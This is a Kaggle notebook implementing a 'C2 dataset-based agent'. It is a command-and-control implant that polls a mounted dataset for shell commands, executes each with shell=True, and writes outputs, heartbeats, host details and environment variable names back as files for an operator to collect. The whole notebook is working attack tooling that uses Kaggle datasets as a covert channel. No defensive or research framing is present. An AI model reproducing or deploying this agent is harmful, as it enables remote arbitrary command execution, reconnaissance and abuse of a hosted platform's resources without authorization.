In [ ]:
# C2 DATASET-BASED AGENT v3.0
# No internet required - uses Kaggle datasets for communication

import json
import time
import os
import subprocess
from pathlib import Path

# CONFIG
KERNEL_ID = 'KERNEL_ID'  # Will be replaced
API_KEY = 'API_KEY'  # Will be replaced
COMMANDS_DATASET = 'COMMANDS_DATASET'  # Will be replaced (username/dataset-name)
POLL_INTERVAL = 10  # seconds
AGENT_VERSION = '3.0-dataset'

print(f'[C2] Agent v{AGENT_VERSION} starting...', flush=True)
print(f'[C2] Kernel: {KERNEL_ID}', flush=True)
print(f'[C2] Commands dataset: {COMMANDS_DATASET}', flush=True)

In [ ]:
# SYSTEM INFO
def get_system_info():
    info = {
        'kernel_id': KERNEL_ID,
        'hostname': os.uname().nodename if hasattr(os, 'uname') else 'unknown',
        'python': os.sys.version,
        'cwd': os.getcwd(),
        'env_keys': list(os.environ.keys())[:20],
        'kaggle_working': str(Path('/kaggle/working').exists()),
        'kaggle_input': str(Path('/kaggle/input').exists()),
    }
    return info

print('[C2] System info collected', flush=True)

In [ ]:
# COMMAND EXECUTOR
def execute_command(cmd, timeout=300):
    result = {
        'command': cmd,
        'timestamp': time.time(),
        'success': False,
        'output': '',
        'error': ''
    }
    
    try:
        print(f'[EXEC] {cmd}', flush=True)
        r = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            timeout=timeout,
            cwd='/kaggle/working'
        )
        result['success'] = r.returncode == 0
        result['output'] = r.stdout[:10000]
        result['error'] = r.stderr[:5000]
        result['returncode'] = r.returncode
    except subprocess.TimeoutExpired:
        result['error'] = 'Timeout'
    except Exception as e:
        result['error'] = str(e)
    
    return result

In [ ]:
# DATASET READER - Read commands from mounted dataset
def read_commands():
    """Read commands from mounted dataset"""
    try:
        # Dataset is mounted at /kaggle/input/dataset-name/
        dataset_name = COMMANDS_DATASET.split('/')[-1]
        cmd_file = Path(f'/kaggle/input/{dataset_name}/commands.json')
        
        if not cmd_file.exists():
            print(f'[C2] Commands file not found: {cmd_file}', flush=True)
            return []
        
        with open(cmd_file) as f:
            data = json.load(f)
        
        # Get commands for this kernel
        commands = data.get('commands', [])
        kernel_targets = data.get('kernel_targets', {})
        
        # Filter commands for this kernel
        my_commands = []
        for cmd in commands:
            target = cmd.get('target', 'all')
            if target == 'all' or target == KERNEL_ID or KERNEL_ID in (target if isinstance(target, list) else [target]):
                if not cmd.get('executed', False):
                    my_commands.append(cmd)
        
        return my_commands
    except Exception as e:
        print(f'[C2] Read error: {e}', flush=True)
        return []

In [ ]:
# RESULT WRITER - Write results to output files
def write_result(result):
    """Write result to output file"""
    try:
        output_dir = Path('/kaggle/working')
        results_file = output_dir / 'results.jsonl'
        
        # Append result as JSON line
        with open(results_file, 'a') as f:
            f.write(json.dumps(result) + '\n')
        
        print(f'[C2] Result written: {result.get("command", "")[:50]}', flush=True)
    except Exception as e:
        print(f'[C2] Write error: {e}', flush=True)

def write_heartbeat():
    """Write heartbeat file"""
    try:
        heartbeat = {
            'kernel_id': KERNEL_ID,
            'timestamp': time.time(),
            'status': 'running',
            'info': get_system_info()
        }
        with open('/kaggle/working/heartbeat.json', 'w') as f:
            json.dump(heartbeat, f)
    except Exception as e:
        print(f'[C2] Heartbeat error: {e}', flush=True)

In [ ]:
# MAIN AGENT LOOP
def run_agent(duration=3600):
    """Run agent for specified duration (seconds)"""
    print(f'[C2] Starting agent loop for {duration}s', flush=True)
    
    # Write initial heartbeat
    write_heartbeat()
    
    start_time = time.time()
    iteration = 0
    
    while time.time() - start_time < duration:
        iteration += 1
        
        # Read commands
        commands = read_commands()
        
        if commands:
            print(f'[C2] Found {len(commands)} commands', flush=True)
            
            for cmd in commands:
                cmd_text = cmd.get('command', '')
                cmd_id = cmd.get('id', '')
                
                # Execute
                result = execute_command(cmd_text)
                result['cmd_id'] = cmd_id
                result['kernel_id'] = KERNEL_ID
                
                # Write result
                write_result(result)
        
        else:
            if iteration % 10 == 0:
                print(f'[C2] No commands (iteration {iteration})', flush=True)
        
        # Update heartbeat every iteration
        write_heartbeat()
        
        # Wait
        time.sleep(POLL_INTERVAL)
    
    print(f'[C2] Agent finished after {iteration} iterations', flush=True)

# Run agent
run_agent(duration=300)  # 5 minutes max